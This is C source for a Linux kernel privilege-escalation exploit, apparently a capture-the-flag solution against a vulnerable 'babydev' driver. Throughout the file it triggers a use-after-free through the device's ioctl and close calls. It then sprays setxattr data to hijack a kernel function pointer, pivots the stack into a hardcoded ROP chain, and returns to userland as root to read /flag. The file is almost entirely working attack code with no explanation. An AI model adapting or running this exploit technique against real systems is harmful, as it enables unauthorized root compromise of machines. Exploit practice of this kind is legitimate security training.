#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>
#include <sys/mman.h>

void get_shell(void) {
        //char *arg[] = {"/bin/sh", NULL};
        //char *env[] = {NULL};
	char rbuf[0x50];

        if(getuid() == 0) {
                printf("got dat root: %d\n", getuid());

		int rfd = open("/flag", O_RDONLY);
		read(rfd, rbuf, 0x50);
                printf("looks like we made it: %s\n", rbuf);
		
		//execve(arg[0], arg, env);
        } else {
                printf("aint got that root\n");
        }
}

unsigned long user_rip = (unsigned long)get_shell;
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
        __asm__(
                ".intel_syntax noprefix;"
                "mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                ".att_syntax;"
        );
}


int main(int argc, char *argv[]) {
	int fd = open("/dev/babydev", O_RDWR);
	int fd2 = open("/dev/babydev", O_RDWR);

	char addr[0x20];
	char buf[0x20];

	unsigned long *rop;

	for(int i=0;i<4;i++) {
		*(unsigned long *)(addr + (i*8)) = 0xffffffff814b5e07; //stack pivy, you privy?
	}

	save_state();

	void *mm = mmap(0x8348c000,0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if(mm == (void*)-1) {
		perror("mmap ");
		return -1;
	}
	rop = (unsigned long *)0x8348ca89;
	*rop++ = 0xffffffff810d238d;
	*rop++ = 0x0;
	*rop++ = 0xffffffff810a1810;
	*rop++ = 0xffffffff8133b32e;
	*rop++ = 0x0;
	*rop++ = 0x0;
	*rop++ = 0xffffffff810a1420;
	*rop++ = 0xffffffff81063694;
	*rop++ = 0x0;
	*rop++ = 0xffffffff8181a797;
	*rop++ = user_rip;
	*rop++ = user_cs;
	*rop++ = user_rflags;
	*rop++ = user_sp;
	*rop++ = user_ss;	


	printf("opened baby\n");
	
	ioctl(fd2, 0x10001, 0x20);
	close(fd2);
	printf("closed one baby\n");
	//getchar();
	
	close(fd);
	//getchar();

	int statfd = open("/proc/self/stat", O_RDONLY);
        if(statfd == -1) {
                printf("failed to open stat\n");
                return -1;
        }
	
	int setx = setxattr("/", "filee", addr, 0x20, 0);
	
	read(statfd, buf, sizeof(buf));

	return 0;
}
